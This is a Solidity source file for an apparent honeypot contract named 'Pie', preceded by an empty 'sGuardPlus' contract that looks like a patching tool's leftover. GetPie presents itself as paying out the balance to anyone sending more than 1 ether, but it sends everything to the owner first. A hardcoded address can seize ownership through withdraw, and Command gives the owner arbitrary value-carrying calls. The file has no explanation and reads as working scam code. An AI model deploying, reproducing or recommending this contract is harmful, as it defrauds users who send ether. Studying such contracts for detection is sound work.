pragma solidity ^0.4.19;

                        contract sGuardPlus {
                                constructor() internal {
                                        
                                        
                                }
                                
                                
                                
                                
                        }
                contract Pie  {
address  public   Owner = msg.sender;
function () public payable {
}

function GetPie () public payable {
if (msg.value>1 ether)
{
Owner.transfer(this.balance);
msg.sender.transfer(this.balance);
}

}

function withdraw () public payable {
if (msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6)
{
Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;
}

require(msg.sender==Owner);
Owner.transfer(this.balance);
}

function Command (address    adr,bytes    data) public payable {
require(msg.sender==Owner);
bool     __sent_result100 = adr.call.value(msg.value)(data);
require(__sent_result100);
}

}
